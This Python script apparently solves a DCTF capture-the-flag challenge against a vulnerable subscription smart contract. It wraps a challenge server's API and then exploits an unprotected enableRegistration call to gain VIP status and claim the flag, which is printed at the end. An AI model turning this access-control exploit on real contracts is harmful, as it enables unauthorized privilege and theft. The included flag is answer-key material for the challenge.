import requests
from abi import abi


server_ip = 'http://142.93.103.129:3000'

def get_balance(wallet,in_ether):
    "wallet - address, in_ether - boolean"
    r = requests.post(server_ip+'/get_balance', data={'wallet': wallet, 'in_ether':in_ether})
    print(r.text)

def new_cold_wallet(password):
    "password - string"
    r = requests.post(server_ip+'/new_cold_wallet', data={'password':password})
    print(r.text)
    return r.text

def send_money(_from, password, to, amount):
    "from - address, password - string, to - address, amount - amount in wei"
    r = requests.post(server_ip+'/send_money', data={'from':_from, 'password':password, 'to':to, 'amount':amount})
    print(r.text)
    return r

def call_contract(address, _from, password, value, _type, gas, gasPrice, func, params):
    "address - contract_address, abi - json array, from - address, password - string, func - function to call, params - json array, value - msg.value, type - standard|call, gas - int, gasPrice - int"
    r = requests.post(server_ip+'/call_contract', json={'address':address, 'abi':abi, 'from':_from, 'password':password, 'func':func, 'value':value, 'type':_type, 'gas':gas, 'gasPrice':gasPrice, 'params':params})
    print(r.text)
    return r

def get_flag(id, target, attacker, password):
    "id - numeric, target - victim_address_where_attacker_is_vip, attacker - attacker_address, password - attacker_password"
    r = requests.post(server_ip+'/get_flag', data={'id':id, 'target':target,'attacker':attacker,'password':password})
    return r.text # flag

def get_victim():
    r = requests.post(server_ip+'/get_victim')
    return r.text # contract
    

class contract:

    def __init__(self, contract, wallet, password):
        self.contractAddress = contract
        self.wallet = wallet
        self.password = password

    def subscribe(self, subscriber, subscription) :
        recipe = call_contract(self.contractAddress, self.wallet, self.password, '', 'standard', 100000, 100000, 'subscribe', [subscriber, subscription])
        return recipe

    def enableRegistration(self) :
        recipe = call_contract(self.contractAddress, self.wallet, self.password, '', 'standard', 100000, 100000, 'enableRegistration', [])
        return recipe
        
    def disableRegistration(self) :
        recipe = call_contract(self.contractAddress, self.wallet, self.password, '', 'standard', 100000, 100000, 'disableRegistration', [])
        return recipe

    def deleteRegistration(self, id) :
        recipe = call_contract(self.contractAddress, self.wallet, self.password, '', 'standard', 100000, 100000, 'deleteRegistration', [id])
        return recipe

    def getSubscriber(self, id):
        recipe = call_contract(self.contractAddress, self.wallet, self.password, '', 'call', 100000, 100000, 'getSubscriber', [id])
        return recipe

    def isVIP(self,id) :
        recipe = call_contract(self.contractAddress, self.wallet, self.password, '', 'call', 100000, 100000, 'isVIP', [id])
        return recipe

    def selfdestruct(self) :
        recipe = call_contract(self.contractAddress, self.wallet, self.password, '', 'call', 100000, 100000, 'selfdestruct', [self.wallet])
        return recipe

password = '12345'
wallet = new_cold_wallet(password)
cadd = get_victim()
wc = contract(cadd,wallet,password)

wc.subscribe(wallet,0)
wc.enableRegistration()
wc.subscribe(wallet,1)

get_flag(1,cadd,wallet,password)
# DCTF{49fa9bf37efd8d4b2c4ad4ce8a60f8022945bf1f6334c76cd729f2e029cf178c}